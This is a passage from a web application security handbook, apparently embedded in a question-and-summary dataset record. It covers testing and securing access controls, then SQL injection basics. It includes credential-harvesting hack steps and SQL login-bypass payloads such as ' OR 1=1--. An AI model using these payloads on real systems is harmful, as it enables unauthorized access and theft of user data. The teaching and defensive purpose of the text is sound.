a relatively\nsmall number, try other numbers in close range, or random numbers with\nthe same number of digits.\n4. If access controls are found to be broken, and resource identifiers are\nfound to be predictable, you can mount an automated attack to harvest\nsensitive resources and information from the application. Use the tech-\nniques described in Chapter 14 to design a bespoke automated attack to\nretrieve the data you require.\nA catastrophic vulnerability of this kind occurs where an Account Information\npage displays a user’s personal details together with his username and pass-\nword. Although the password typically is masked on-screen, it is nevertheless\ntransmitted in full to the browser. Here, you can often quickly iterate through\nthe full range of account identifi ers to harvest the login credentials of all users,\nincluding administrators. Figure 8-5 shows Burp Intruder being used to carry\nout a successful attack of this kind.\nFigure 8-5: A successful attack to harvest usernames and passwords via\nan access control vulnerability\ncc0088..iinndddd 227755 88//1199//22001111 1122::0088::3333 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 276\n276 Chapter 8 n Attacking Access Controls\nTRY IT!\nhttp://mdsec.net/auth/488/\nhttp://mdsec.net/auth/494/\nTIP When you detect an access control vulnerability, an immediate attack to\nfollow up with is to attempt to escalate your privileges further by compro-\nmising a user account that has administrative privileges. You can use various\ntricks to locate an administrative account. Using an access control fl aw like\nthe one illustrated, you may harvest hundreds of user credentials and not\nrelish the task of logging in manually as every user until you fi nd an admin-\nistrator. However, when accounts are identifi ed by a sequential numeric\nID, it is common to fi nd that the lowest account numbers are assigned to\nadministrators. Logging in as the fi rst few users who were registered with\nthe application often identifi es an administrator. If this approach fails, an\neffective method is to fi nd a function within the application where access is\nproperly segregated horizontally, such as the main home page presented to\neach user. Write a script to log in using each set of captured credentials, and\nthen try to access your own home page. It is likely that administrative users\ncan view every user’s home page, so you will immediately detect when an\nadministrative account is being used.\nTesting Direct Access to Methods\nWhere an application uses requests that give direct access to server-side API\nmethods, any access control weaknesses within those methods normally are\nidentifi ed using the methodology already described. However, you should also\ntest for the existence of additional APIs that may not be properly protected.\nFor example, a servlet may be invoked using the following request:\nPOST /svc HTTP/1.1\nAccept-Encoding: gzip, deflate\nHost: wahh-app\nContent-Length: 37\nservlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug\nSince this is a well-known servlet, perhaps you can access other servlets to\nperform unauthorized actions.\ncc0088..iinndddd 227766 88//1199//22001111 1122::0088::3333 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 277\nChapter 8 n Attacking Access Controls 277\n\nHACK STEPS\n1. Identify any parameters that follow Java naming conventions (for exam-\nple,get,set,add,update,is, or has followed by a capitalized word), or\nexplicitly specify a package structure (for example, com.companyname\n.xxx.yyy.ClassName). Make a note of all referenced methods you can\nfind.\n2. Look out for a method that lists the available interfaces or methods.\nCheck through your proxy history to see if it has been called as part of\nthe application’s normal communication. If not, try to guess it using the\nobserved naming convention.\n3. Consult public resources such as search engines and forum sites to deter-\nmine any other methods that might be accessible.\n4. Use the techniques described in Chapter 4 to guess other method names.\n5. Attempt to access all methods gathered using a variety of user account\ntypes, including unauthenticated access.\n6. If you do not know the number or types of arguments expected by some\nmethods, look for methods that are less likely to take arguments, such as\nlistInterfaces and getAllUsersInRoles.\nTesting Controls Over Static Resources\nIn cases where static resources that the application is protecting are ultimately\naccessed directly via URLs to the resource fi les themselves, you should test\nwhether it is possible for unauthorized users to simply request these URLs directly.\n\nHACK STEPS\n1. Step through the normal process for gaining access to a protected static\nresource to obtain an example of the URL by which it is ultimately\nretrieved.\n2. Using a different user context (for example, a less-privileged user or an\naccount that has not made a required purchase), attempt to access the\nresource directly using the URL you have identified.\n3. If this attack succeeds, try to understand the naming scheme being used\nfor protected static files. If possible, construct an automated attack to\ntrawl for content that may be useful or that may contain sensitive data\n(see Chapter 14).\ncc0088..iinndddd 227777 88//1199//22001111 1122::0088::3344 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 278\n278 Chapter 8 n Attacking Access Controls\nTesting Restrictions on HTTP Methods\nAlthough there may not be a ready means of detecting whether an application’s\naccess controls make use of platform-level controls over HTTP methods, you\ncan take some simple steps to identify any vulnerabilities.\n\nHACK STEPS\n1. Using a high-privileged account, identify some privileged requests that\nperform sensitive actions, such as adding a new user or changing a user’s\nsecurity role.\n2. If these requests are not protected by any anti-CSRF tokens or similar\nfeatures (see Chapter 13), use the high-privileged account to determine\nwhether the application still carries out the requested action if the HTTP\nmethod is modified. Test the following HTTP methods:\nn POST\nn GET\nn HEAD\nn An arbitrary invalid HTTP method\n3. If the application honors any requests using different HTTP methods than\nthe original method, test the access controls over those requests using the\nstandard methodology already described, using accounts with lower\nprivileges.\nSecuring Access Controls\nAccess controls are one of the easiest areas of web application security to under-\nstand, although you must carefully apply a well-informed, thorough methodology\nwhen implementing them.\nFirst, you should avoid several obvious pitfalls. These usually arise from\nignorance about the essential requirements of effective access control or fl awed\nassumptions about the kinds of requests that users will make and against which\nthe application needs to defend itself:\nn Do not rely on users’ ignorance of application URLs or the identifi ers used\nto specify application resources, such as account numbers and document\nIDs. Assume that users know every application URL and identifi er, and\nensure that the application’s access controls alone are suffi cient to prevent\nunauthorized access.\ncc0088..iinndddd 227788 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 279\nChapter 8 n Attacking Access Controls 279\nn Do not trust any user-submitted parameters to signify access rights (such\nasadmin=true).\nn Do not assume that users will access application pages in the intended\nsequence. Do not assume that because users cannot access the Edit Users\npage, they cannot reach the Edit User X page that is linked from it.\nn Do not trust the user not to tamper with any data that is transmitted via\nthe client. If some user-submitted data has been validated and then is\ntransmitted via the client, do not rely on the retransmitted value without\nrevalidation.\nThe following represents a best-practice approach to implementing effective\naccess controls within web applications:\nn Explicitly evaluate and document the access control requirements for\nevery unit of application functionality. This needs to include both who\ncan legitimately use the function and what resources individual users\nmay access via the function.\nn Drive all access control decisions from the user’s session.\nn Use a central application component to check access controls.\nn Process every client request via this component to validate that the user\nmaking the request is permitted to access the functionality and resources\nbeing requested.\nn Use programmatic techniques to ensure that there are no exceptions to the\nprevious point. An effective approach is to mandate that every application\npage must implement an interface that is queried by the central access\ncontrol mechanism. If you force developers to explicitly code access control\nlogic into every page, there can be no excuse for omissions.\nn For particularly sensitive functionality, such as administrative pages, you\ncan further restrict access by IP address to ensure that only users from\na specifi c network range can access the functionality, regardless of their\nlogin status.\nn If static content needs to be protected, there are two methods of provid-\ning access control. First, static fi les can be accessed indirectly by passing\na fi lename to a dynamic server-side page that implements relevant access\ncontrol logic. Second, direct access to static fi les can be controlled using HTTP\nauthentication or other features of the application server to wrap the incom-\ning request and check the resource’s permissions before access is granted.\nn Identifi ers specifying which resource a user wants to access are vulner-\nable to tampering whenever they are transmitted via the client. The server\ncc0088..iinndddd 227799 88//1199//22001111 1122::0088::3344 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 280\n280 Chapter 8 n Attacking Access Controls\nshould trust only the integrity of server-side data. Any time these identi-\nfi ers are transmitted via the client, they need to be revalidated to ensure\nthat the user is authorized to access the requested resource.\nn For security-critical application functions such as the creation of a new bill\npayee in a banking application, consider implementing per-transaction\nreauthentication and dual authorization to provide additional assurance\nthat the function is not being used by an unauthorized party. This also\nmitigates the consequences of other possible attacks, such as session\nhijacking.\nn Log every event where sensitive data is accessed or a sensitive action is\nperformed. These logs will enable potential access control breaches to be\ndetected and investigated.\nWeb application developers often implement access control functions on a\npiecemeal basis. They add code to individual pages in cases where some access\ncontrol is required, and they often cut and paste the same code between pages\nto implement similar requirements. This approach carries an inherent risk of\ndefects in the resulting access control mechanism. Many cases are overlooked\nwhere controls are required, controls designed for one area may not operate in\nthe intended way in another area, and modifi cations made elsewhere within the\napplication may break existing controls by violating assumptions made by them.\nIn contrast to this approach, the previously described method of using a\ncentral application component to enforce access controls has many benefi ts:\nn It increases the clarity of access controls within the application, enabling\ndifferent developers to quickly understand the controls implemented by\nothers.\nn It makes maintainability more effi cient and reliable. Most changes need\nto be applied only once, to a single shared component, and do not need\nto be cut and pasted to multiple locations.\nn It improves adaptability. Where new access control requirements arise,\nthey can be easily refl ected within an existing API implemented by each\napplication page.\nn It results in fewer mistakes and omissions than if access control code is\nimplemented piecemeal throughout the application.\nA Multilayered Privilege Model\nIssues relating to access apply not only to the web application itself but also\nto the other infrastructure tiers that lie beneath it — in particular, the applica-\ntion server, the database, and the operating system. Taking a defense-in-depth\napproach to security entails implementing access controls at each of these layers\ncc0088..iinndddd 228800 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 281\nChapter 8 n Attacking Access Controls 281\nto create several layers of protection. This provides greater assurance against\nthreats of unauthorized access, because if an attacker succeeds at compromising\ndefenses at one layer, the attack may yet be blocked by defenses at another layer.\nIn addition to implementing effective access controls within the web appli-\ncation itself, as already described, a multilayered approach can be applied in\nvarious ways to the components that underlie the application:\nn The application server can be used to control access to entire URL paths\non the basis of user roles that are defi ned at the application server tier.\nn The application can employ a different database account when car-\nrying out the actions of different users. For users who should only be\nquerying data (not updating it), an account with read-only privileges\nshould be used.\nn Fine-grained control over access to different database tables can be imple-\nmented within the database itself, using a table of privileges.\nn The operating system accounts used to run each component in the infra-\nstructure can be restricted to the least powerful privileges that the com-\nponent actually requires.\nIn a complex, security-critical application, layered defenses of this kind can\nbe devised with the help of a matrix defi ning the different user roles within\nthe application and the different privileges, at each tier, that should be assigned\nto each role. Figure 8-6 is a partial example of a privilege matrix for a complex\napplication.\nApplication Server Application Roles Database Privileges\nFigure 8-6: A privilege matrix for a complex application\ncc0088..iinndddd 228811 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 282\n282 Chapter 8 n Attacking Access Controls\nWithin a security model of this kind, you can see how various useful access\ncontrol concepts can be applied:\nn Programmatic control — The matrix of individual database privileges is\nstored in a table within the database and is applied programmatically to\nenforce access control decisions. The classifi cation of user roles provides a\nshortcut for applying certain access control checks, and this is also applied\nprogrammatically. Programmatic controls can be extremely fi ne-grained\nand can build arbitrarily complex logic into the process of carrying out\naccess control decisions within the application.\nn Discretionary access control (DAC) — Administrators can delegate their\nprivileges to other users in relation to specifi c resources they own, employ-\ning discretionary access control. This is a closedDAC model, in which access\nis denied unless explicitly granted. Administrators also can lock or expire\nindividual user accounts. This is an openDAC model, in which access is\npermitted unless explicitly withdrawn. Various application users have privi-\nleges to create user accounts, again applying discretionary access control.\nn Role-based access control (RBAC) — Named roles contain different sets\nof specifi c privileges, and each user is assigned to one of these roles. This\nserves as a shortcut for assigning and enforcing different privileges and\nis necessary to help manage access control in complex applications. Using\nroles to perform up-front access checks on user requests enables many\nunauthorized requests to be quickly rejected with a minimum amount of\nprocessing being performed. An example of this approach is protecting\nthe URL paths that specifi c types of users may access.\nWhen designing role-based access control mechanisms, you must balance\nthe number of roles so that they remain a useful tool to help manage privi-\nleges within the application. If too many fi ne-grained roles are created, the\nnumber of different roles becomes unwieldy, and they are diffi cult to manage\naccurately. If too few roles are created, the resulting roles will be a coarse\ninstrument for managing access. It is likely that individual users will be\nassigned privileges that are not strictly necessary to perform their function.\nIf platform-level controls are used to restrict access to different application\nroles based on HTTP method and URL, these should be designed using\na default-deny model, as is best practice for fi rewall rules. This should\ninclude various specifi c rules that assign certain HTTP methods and URLs\nto certain roles, and the fi nal rule should deny any request that does not\nmatch a previous rule.\nn Declarative control — The application uses restricted database accounts\nwhen accessing the database. It employs different accounts for different\ngroups of users, with each account having the least level of privilege\ncc0088..iinndddd 228822 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 283\nChapter 8 n Attacking Access Controls 283\nnecessary to carry out the actions that group is permitted to perform.\nDeclarative controls of this kind are declared from outside the applica-\ntion. This is a useful application of defense-in-depth principles, because\nprivileges are imposed on the application by a different component. Even\nif a user fi nds a way to breach the access controls implemented within the\napplication tier in order to perform a sensitive action, such as adding a\nnew user, he is prevented from doing so. The database account that he is\nusing does not have the required privileges within the database.\nA different means of applying declarative access control exists at the\napplication server level, via deployment descriptor fi les, which are applied\nduring application deployment. However, these can be relatively blunt\ninstruments and do not always scale well to manage fi ne-grained privi-\nleges in a large application.\n\nHACK STEPS\nIf you are attacking an application that employs a multilayered privilege\nmodel of this kind, it is likely that many of the most obvious mistakes that\nare commonly made in applying access controls will be defended against. You\nmay fi nd that circumventing the controls implemented within the application\ndoes not get you very far, because of protection in place at other layers. With\nthis in mind, several potential lines of attack are still available to you. Most\nimportantly, understanding the limitations of each type of control, in terms of\nthe protection it does not offer, will help you identify the vulnerabilities that\nare most likely to affect it:\nn Programmatic checks within the application layer may be susceptible to\ninjection-based attacks.\nn Roles defi ned at the application server layer are often coarsely defi ned\nand may be incomplete.\nn Where application components run using low-privileged operating sys-\ntem accounts, typically they can read many kinds of potentially sensitive\ndata within the host fi le system. Any vulnerabilities granting arbitrary fi le\naccess may still be usefully exploited, even if only to read sensitive data.\nn Vulnerabilities within the application server software itself typically\nenable you to defeat all access controls implemented within the appli-\ncation layer, but you may still have limited access to the database and\noperating system.\nn A single exploitable access control vulnerability in the right location may\nstill provide a starting point for serious privilege escalation. For example,\nif you discover a way to modify the role associated with your account,\nyou may fi nd that logging in again with that account gives you enhanced\naccess at both the application and database layers.\ncc0088..iinndddd 228833 88//1199//22001111 1122::0088::3344 PPMM\n\nStuttard c08.indd V3 - 07/28/2011 Page 284\n284 Chapter 8 n Attacking Access Controls\nSummary\nAccess control defects can manifest themselves in various ways. In some cases,\nthey may be uninteresting, allowing illegitimate access to a harmless function\nthat cannot be leveraged to escalate privileges any further. In other cases, fi nd-\ning a weakness in access controls can quickly lead to a complete compromise\nof the application.\nFlaws in access control can arise from various sources. A poor application\ndesign may make it diffi cult or impossible to check for unauthorized access, a\nsimple oversight may leave only one or two functions unprotected, or defective\nassumptions about how users will behave can leave the application undefended\nwhen those assumptions are violated.\nIn many cases, fi nding a break in access controls is almost trivial. You simply\nrequest a common administrative URL and gain direct access to the functional-\nity. In other cases, it may be very hard, and subtle defects may lurk deep within\napplication logic, particularly in complex, high-security applications. The most\nimportant lesson when attacking access controls is to look everywhere. If you\nare struggling to make progress, be patient, and test every step of every applica-\ntion function. A bug that allows you to own the entire application may be just\naround the corner.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. An application may use the HTTP Referer header to control access without\nany overt indication of this in its normal behavior. How can you test for\nthis weakness?\n2. You log in to an application and are redirected to the following URL:\nhttps://wahh-app.com/MyAccount.php?uid=1241126841\nThe application appears to be passing a user identifi er to the MyAccount.php\npage. The only identifi er you are aware of is your own. How can you test\nwhether the application is using this parameter to enforce access controls\nin an unsafe way?\n3. A web application on the Internet enforces access controls by examining\nusers’ source IP addresses. Why is this behavior potentially fl awed?\ncc0088..iinndddd 228844 88//1199//22001111 1122::0088::3344 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 285\nChapter 8 n Attacking Access Controls 285\n4. An application’s sole purpose is to provide a searchable repository of\ninformation for use by members of the public. There are no authentica-\ntion or session-handling mechanisms. What access controls should be\nimplemented within the application?\n5. When browsing an application, you encounter several sensitive resources\nthat need to be protected from unauthorized access and that have the .xls\nfi le extension. Why should these immediately catch your attention?\ncc0088..iinndddd 228855 88//1199//22001111 1122::0088::3355 PPMM\nStuttard c08.indd V1 - 07/04/2011 Page 286\ncc0088..iinndddd 228866 88//1199//22001111 1122::0088::3355 PPMM",
    "question": "What are the key concepts and methods discussed in the text regarding attacking access controls in web applications?",
    "summary": "This text discusses common vulnerabilities in session management and access controls in web applications. It explains how attackers can exploit weaknesses in session tokens, access control mechanisms, and other features to gain unauthorized access. The chapter emphasizes the importance of thorough testing and careful implementation of access controls to prevent privilege escalation and data breaches. It also highlights the need to consider multiple layers of security, including application, database, and operating system levels, to effectively defend against attacks."
  },
  {
    "start": 228,
    "end": 249,
    "text": "Stuttard c09.indd V3 - 07/28/2011 Page 287\n\nCHAPTER\n9\nAttacking Data Stores\nNearly all applications rely on a data store to manage data that is processed\nwithin the application. In many cases this data drives the core application logic,\nholding user accounts, permissions, application confi guration settings, and more.\nData stores have evolved to become signifi cantly more than passive containers\nfor data. Most hold data in a structured format, accessed using a predefi ned\nquery format or language, and contain internal logic to help manage that data.\nTypically, applications use a common privilege level for all types of access\nto the data store and when processing data belonging to different application\nusers. If an attacker can interfere with the application’s interaction with the data\nstore, to make it retrieve or modify different data, he can usually bypass any\ncontrols over data access that are imposed at the application layer.\nThe principle just described can be applied to any kind of data store tech-\nnology. Because this is a practical handbook, we will focus on the knowledge\nand techniques you need to exploit the vulnerabilities that exist in real-world\napplications. By far the most common data stores are SQL databases, XML-\nbased repositories, and LDAP directories. Practical examples seen elsewhere\nare also covered.\nIn covering these key examples, we will describe the practical steps that you\ncan take to identify and exploit these defects. There is a conceptual synergy in\nthe process of understanding each new type of injection. Having grasped the\nessentials of exploiting these manifestations of the fl aw, you should be confi dent\nthat you can draw on this understanding when you encounter a new category\n287\ncc0099..iinndddd 228877 88//1199//22001111 1122::0099::2288 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 288\n288 Chapter 9 n Attacking Data Stores\nof injection. Indeed, you should be able to devise additional means of attacking\nthose that others have already studied.\nInjecting into Interpreted Contexts\nAn interpreted language is one whose execution involves a runtime component\nthat interprets the language’s code and carries out the instructions it contains.\nIn contrast, a compiled language is one whose code is converted into machine\ninstructions at the time of generation. At runtime, these instructions are executed\ndirectly by the processor of the computer that is running it.\nIn principle, any language can be implemented using either an interpreter or\na compiler, and the distinction is not an inherent property of the language itself.\nNevertheless, most languages normally are implemented in only one of these\ntwo ways, and many of the core languages used to develop web applications\nare implemented using an interpreter, including SQL, LDAP, Perl, and PHP.\nBecause of how interpreted languages are executed, a family of vulnerabilities\nknown as codeinjection arises. In any useful application, user-supplied data is\nreceived, manipulated, and acted on. Therefore, the code that the interpreter\nprocesses is a mix of the instructions written by the programmer and the data\nsupplied by the user. In some situations, an attacker can supply crafted input\nthat breaks out of the data context, usually by supplying some syntax that has\na special signifi cance within the grammar of the interpreted language being\nused. The result is that part of this input gets interpreted as program instruc-\ntions, which are executed in the same way as if they had been written by the\noriginal programmer. Often, therefore, a successful attack fully compromises\nthe component of the application that is being targeted.\nIn native compiled languages, on the other hand, attacks designed to execute\narbitrary commands are usually very different. The method of injecting code\nnormally does not leverage any syntactic feature of the language used to develop\nthe target program, and the injected payload usually contains machine code\nrather than instructions written in that language. See Chapter 16 for details of\ncommon attacks against native compiled software.\nBypassing a Login\nThe process by which an application accesses a data store usually is the same,\nregardless of whether that access was triggered by the actions of an unprivi-\nleged user or an application administrator. The web application functions as a\ndiscretionary access control to the data store, constructing queries to retrieve,\nadd, or modify data in the data store based on the user’s account and type.\nA successful injection attack that modifi es a query (and not merely the data\ncc0099..iinndddd 228888 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 289\nChapter 9 n Attacking Data Stores 289\nwithin the query) can bypass the application’s discretionary access controls\nand gain unauthorized access.\nIf security-sensitive application logic is controlled by the results of a query, an\nattacker can potentially modify the query to alter the application’s logic. Let’s\nlook at a typical example where a back-end data store is queried for records in\na user table that match the credentials that a user supplied. Many applications\nthat implement a forms-based login function use a database to store user cre-\ndentials and perform a simple SQL query to validate each login attempt. Here\nis a typical example:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nThis query causes the database to check every row within the users table\nand extract each record where the username column has the value marcus and\nthe password column has the value secret. If a user’s details are returned to\nthe application, the login attempt is successful, and the application creates an\nauthenticated session for that user.\nIn this situation, an attacker can inject into either the username or the password\nfi eld to modify the query performed by the application and thereby subvert its\nlogic. For example, if an attacker knows that the username of the application\nadministrator is admin, he can log in as that user by supplying any password\nand the following username:\nadmin’--\nThis causes the application to perform the following query:\nSELECT * FROM users WHERE username = ‘admin’--’ AND password = ‘foo’\nNote that the comment sequence (--) causes the remainder of the query to\nbe ignored, and so the query executed is equivalent to:\nSELECT * FROM users WHERE username = ‘admin’\nso the password check is bypassed.\nTRY IT!\nhttp://mdsec.net/auth/319/\nSuppose that the attacker does not know the administrator’s username. In\nmost applications, the fi rst account in the database is an administrative user,\nbecause this account normally is created manually and then is used to generate\ncc0099..iinndddd 228899 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 290\n290 Chapter 9 n Attacking Data Stores\nall other accounts via the application. Furthermore, if the query returns the\ndetails for more than one user, most applications will simply process the fi rst\nuser whose details are returned. An attacker can often exploit this behavior to\nlog in as the fi rst user in the database by supplying the username:\n‘ OR 1=1--\nThis causes the application to perform the query:\nSELECT * FROM users WHERE username = ‘’ OR 1=1--’ AND password = ‘foo’\nBecause of the comment symbol, this is equivalent to:\nSELECT * FROM users WHERE username = ‘’ OR 1=1\nwhich returns the details of all application users.\nNOTE Injecting into an interpreted context to alter application logic is a\ngeneric attack technique. A corresponding vulnerability could arise in LDAP\nqueries, XPath queries, message queue implementations, or indeed any\ncustom query language.\n\nHACK STEPS\nInjection into interpreted languages is a broad topic, encompassing many\ndifferent kinds of vulnerabilities and potentially affecting every component of\na web application’s supporting infrastructure. The detailed steps for detecting\nand exploiting code injection fl aws depend on the language that is being\ntargeted and the programming techniques employed by the application’s\ndevelopers. In every instance, however, the generic approach is as follows:\n1. Supply unexpected syntax that may cause problems within the context of\nthe particular interpreted language.\n2. Identify any anomalies in the application’s response that may indicate the\npresence of a code injection vulnerability.\n3. If any error messages are received, examine these to obtain evidence\nabout the problem that occurred on the server.\n4. If necessary, systematically modify your initial input in relevant ways in an\nattempt to confirm or disprove your tentative diagnosis of a vulnerability.\n5. Construct a proof-of-concept test that causes a safe command to be\nexecuted in a verifiable way, to conclusively prove that an exploitable\ncode injection flaw exists.\n6. Exploit the vulnerability by leveraging the functionality of the target\nlanguage and component to achieve your objectives.\ncc0099..iinndddd 229900 88//1199//22001111 1122::0099::2299 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 291\nChapter 9 n Attacking Data Stores 291\nInjecting into SQL\nAlmost every web application employs a database to store the various kinds of\ninformation it needs to operate. For example, a web application deployed by an\nonline retailer might use a database to store the following information:\nn User accounts, credentials, and personal information\nn Descriptions and prices of goods for sale\nn Orders, account statements, and payment details\nn The privileges of each user within the application\nThe means of accessing information within the database is Structured Query\nLanguage (SQL). SQL can be used to read, update, add, and delete information\nheld within the database.\nSQL is an interpreted language, and web applications commonly construct\nSQL statements that incorporate user-supplied data. If this is done in an unsafe\nway, the application may be vulnerable to SQL injection. This fl aw is one of the\nmost notorious vulnerabilities to have affl icted web applications. In the most\nserious cases, SQL injection can enable an anonymous attacker to read and\nmodify all data stored within the database, and even take full control of the\nserver on which the database is running.\nAs awareness of web application security has evolved, SQL injection vulner-\nabilities have become gradually less widespread and more diffi cult to detect\nand exploit. Many modern applications avoid SQL injection by employing APIs\nthat, if properly used, are inherently safe against SQL injection attacks. In these\ncircumstances, SQL injection typically occurs in the occasional cases where these\ndefense mechanisms cannot be applied. Finding SQL injection is sometimes a\ndiffi cult task, requiring perseverance to locate the one or two instances in an\napplication where the usual controls have not been applied.\nAs this trend has developed, methods for fi nding and exploiting SQL injection\nfl aws have evolved, using more subtle indicators of vulnerabilities, and more\nrefi ned and powerful exploitation techniques. We will begin by examining\nthe most basic cases and then go on to describe the latest techniques for blind\ndetection and exploitation.\nA wide range of databases are employed to support web applications. Although\nthe fundamentals of SQL injection are common to the vast majority of these, there\nare many differences. These range from minor variations in syntax to signifi cant\ndivergences in behavior and functionality that can affect the types of attacks you\ncan pursue. For reasons of space and sanity, we will restrict our examples to the\nthree most common databases you are likely to encounter — Oracle, MS-SQL,\nand MySQL. Wherever applicable, we will draw attention to the differences\nbetween these three platforms. Equipped with the techniques we describe here,\ncc0099..iinndddd 229911 88//1199//22001111 1122::0099::2299 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 292\n292 Chapter 9 n Attacking Data Stores\nyou should be able to identify and exploit SQL injection fl aws against any other\ndatabase by performing some quick additional research.\nTIP In many situations, you will fi nd it extremely useful to have access to\na local installation of the same database that is being used by the applica-\ntion you are targeting. You will often fi nd that you need to tweak a piece of\nsyntax, or consult a built-in table or function, to achieve your objectives. The\nresponses you receive from the target application will often be incomplete\nor cryptic, requiring some detective work to understand. All of this is much\neasier if you can cross-reference with a fully transparent working version of\nthe database in question.\nIf this is not feasible, a good alternative is to fi nd a suitable interactive\nonline environment that you can experiment on, such as the interactive tutori-\nals at SQLzoo.net.\nExploiting a Basic Vulnerability\nConsider a web application deployed by a book retailer that enables users to\nsearch for products by author, title, publisher, and so on. The entire book catalog\nis held within a database, and the application uses SQL queries to retrieve details\nof different books based on the search terms supplied by users.\nWhen a user searches for all books published by Wiley, the application per-\nforms the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and\npublished=1\nThis query causes the database to check every row within the books table,\nextract each of the records where the publisher column has the value Wiley and\npublished has the value 1, and return the set of all these records. The application\nthen processes this record set and presents it to the user within an HTML page.\nIn this query, the words to the left of the equals sign are SQL keywords and\nthe names of tables and columns within the database. This portion of the query\nwas constructed by the programmer when the application was created. The\nexpression Wiley is supplied by the user, and its signifi cance is as an item of\ndata. String data in SQL queries must be encapsulated within single quotation\nmarks to separate it from the rest of the query.\nNow, consider what happens when a user searches for all books published\nby O’Reilly. This causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’ and\npublished=1\ncc0099..iinndddd 229922 88//1199//22001111 1122::0099::2299 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 293\nChapter 9 n Attacking Data Stores 293\nIn this case, the query interpreter reaches the string data in the same way as\nbefore. It parses this data, which is encapsulated within single quotation marks,\nand obtains the value O. It then encounters the expression Reilly’, which is not\nvalid SQL syntax, and therefore generates an error:\nIncorrect syntax near ‘Reilly’.\nServer: Msg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character string ‘\nWhen an application behaves in this way, it is wide open to SQL injection.\nAn attacker can supply input containing a quotation mark to terminate the\nstring he controls. Then he can write arbitrary SQL to modify the query that\nthe developer intended the application to execute. In this situation, for example,\nthe attacker can modify the query to return every book in the retailer’s catalog\nby entering this search term:\nWiley’ OR 1=1--\nThis causes the application to perform the following query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR\n1=1--’ and published=1\nThis modifi es the WHERE clause of the developer’s query to add a second\ncondition. The database checks every row in the books table and extracts\neach record where the publisher column has the value Wiley or where 1 is\nequal to 1. Because 1 always equals 1, the database returns every record in\nthe books table.\nThe double hyphen in the attacker’s input is a meaningful expression in SQL\nthat tells the query interpreter that the remainder of the line is a comment and\nshould be ignored. This trick is extremely useful in some SQL injection attacks,\nbecause it enables you to ignore the remainder of the query created by the\napplication developer. In the example, the application encapsulates the user-\nsupplied string in single quotation marks. Because the attacker has terminated\nthe string he controls and injected some additional SQL, he needs to handle the\ntrailing quotation mark to avoid a syntax error, as in the O’Reilly example. He\nachieves this by adding a double hyphen, causing the remainder of the query\nto be treated as a comment. In MySQL, you need to include a space after the\ndouble hyphen, or use a hash character to specify a comment.\nThe original query also controlled access to only published books, because\nit specifi ed and published=1. By injecting the comment sequence, the attacker\nhas gained unauthorized access by returning details of all books, published or\notherwise.\ncc0099..iinndddd 229933 88//1199//22001111 1122::0099::2299 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 294\n294 Chapter 9 n Attacking Data Stores\nTIP In some situations, an alternative way to handle the trailing quotation\nmark without using the comment symbol is to “balance the quotes.” You fi n-\nish the injected input with an item of string data that requires a trailing quote\nto encapsulate it. For example, entering the search term:\nWiley’ OR ‘a’ = ‘a\nresults in the query:\nSELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR\n‘a’=’a’ and published=1\nThis is perfectly valid and achieves the same result as the 1 = 1 attack to\nreturn all books published by Wiley, regardless of whether they have been\npublished.\nThis example shows how application logic can be bypassed, allowing an access\ncontrol fl aw in which the attacker can view all books, not just books match-\ning the allowed fi lter (showing published books). However, we will describe\nshortly how SQL injection fl aws like this can be used to extract arbitrary data\nfrom different database tables and to escalate privileges within the database\nand the database server. For this reason, any SQL injection vulnerability should\nbe regarded as extremely serious, regardless of its precise context within the\napplication’s functionality.\nInjecting into Different Statement Types\nThe SQL language contains a number of verbs that may appear at the beginning\nof statements. Because it is the most commonly used verb, the majority of SQL\ninjection vulnerabilities arise within SELECT statements. Indeed, discussions\nabout SQL injection often give the impression that the vulnerability occurs only\nin connection with SELECT statements, because the examples used are all of this\ntype. However, SQL injection fl aws can exist within any type of statement. You\nneed to be aware of some important considerations in relation to each.\nOf course, when you are interacting with a remote application, it usually is\nnot possible to know in advance what type of statement a given item of user\ninput will be processed by. However, you can usually make an educated guess\nbased on the type of application function you are dealing with. The most com-\nmon types of SQL statements and their uses are described here.\nSELECT Statements\nSELECT statements are used to retrieve information from the database. They are\nfrequently employed in functions where the application returns information in\nresponse to user actions, such as browsing a product catalog, viewing a user’s\ncc0099..iinndddd 229944 88//1199//22001111 1122::0099::3300 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 295\nChapter 9 n Attacking Data Stores 295\nprofi le, or performing a search. They are also often used in login functions where\nuser-supplied information is checked against data retrieved from a database.\nAs in the previous examples, the entry point for SQL injection attacks normally\nis the query’s WHERE clause. User-supplied items are passed to the database to\ncontrol the scope of the query’s results. Because the WHERE clause is usually the\nfi nal component of a SELECT statement, this enables the attacker to use the com-\nment symbol to truncate the query to the end of his input without invalidating\nthe syntax of the overall query.\nOccasionally, SQL injection vulnerabilities occur that affect other parts of the\nSELECT query, such as the ORDER BY clause or the names of tables and columns.\nTRY IT!\nhttp://mdsec.net/addressbook/32/\nINSERT Statements\nINSERT statements are used to create a new row of data within a table. They are\ncommonly used when an application adds a new entry to an audit log, creates\na new user account, or generates a new order.\nFor example, an application may allow users to self-register, specifying their\nown username and password, and may 